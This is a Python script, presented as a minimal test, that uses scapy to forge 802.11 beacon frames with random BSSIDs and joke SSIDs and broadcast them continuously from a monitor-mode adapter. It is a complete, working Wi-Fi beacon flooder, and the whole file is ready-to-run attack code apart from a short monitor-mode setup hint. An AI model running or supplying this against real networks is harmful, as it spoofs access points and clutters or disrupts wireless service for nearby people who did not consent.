#!/usr/bin/env python3
"""
Simple beacon flooder test - minimal working example
This shows exactly how beacon flooding should work
"""

from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp, RandMAC
import time
import random


def get_bssid():
    """Generate a valid unicast locally-administered MAC"""
    mac = str(RandMAC())
    parts = mac.split(':')
    # Force unicast (bit 0 = 0) and locally administered (bit 1 = 1)
    first_octet = (int(parts[0], 16) & 0xFE) | 0x02
    return "%02x:%s" % (first_octet, ':'.join(parts[1:]))


def create_beacon_frame(ssid, bssid):
    """Create a proper beacon frame"""

    # Build frame layers
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid)
    beacon = Dot11Beacon(cap='ESS', beacon_interval=100)
    essid = Dot11Elt(ID='SSID', info=ssid.encode(), len=len(ssid))
    dsset = Dot11Elt(ID='DSset', info=b'\x06')  # Channel 6
    rates = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
    esrates = Dot11Elt(ID='ESRates', info=b'\x30\x48\x60\x6c')

    # Combine all layers
    frame = RadioTap() / dot11 / beacon / essid / dsset / rates / esrates

    return frame


def main():
    """Main beacon flooding function"""

    # Configuration
    IFACE = input("Enter your monitor mode interface (e.g., wlan0mon): ").strip()

    # Test SSIDs
    ssids = [
        "FBI_Surveillance_Van",
        "PrettyFlyForAWiFi",
        "ItHurtsWhenIP",
        "Free_WiFi_Definitely_Not_A_Trap"
    ]

    print("\n[+] Creating beacon frames...")
    frames = []

    # Create frames (one per SSID with unique BSSID)
    for ssid in ssids:
        bssid = get_bssid()
        frame = create_beacon_frame(ssid, bssid)
        frames.append(frame)
        print(f"[+] Created frame for SSID: {ssid} with BSSID: {bssid}")

    print(f"\n[+] Created {len(frames)} beacon frames")
    print(f"[+] Starting beacon flood on {IFACE}")
    print("[+] Press Ctrl+C to stop\n")

    time.sleep(2)

    # Send beacons continuously
    sent = 0
    try:
        while True:
            # Send all frames
            sendp(frames, iface=IFACE, verbose=False, inter=0.1)

            sent += len(frames)
            print(f"\r[+] Beacons sent: {sent}", end='', flush=True)

            # Wait 100ms before next batch (matches beacon_interval=100)
            time.sleep(0.1)

    except KeyboardInterrupt:
        print(f"\n\n[+] Stopped. Total beacons sent: {sent}")


if __name__ == "__main__":
    print("="*60)
    print("Simple Beacon Flooder - Test Script")
    print("="*60)
    print("\nNOTE: Your WiFi adapter MUST be in monitor mode!")
    print("Example: sudo airmon-ng start wlan0")
    print("="*60 + "\n")

    main()
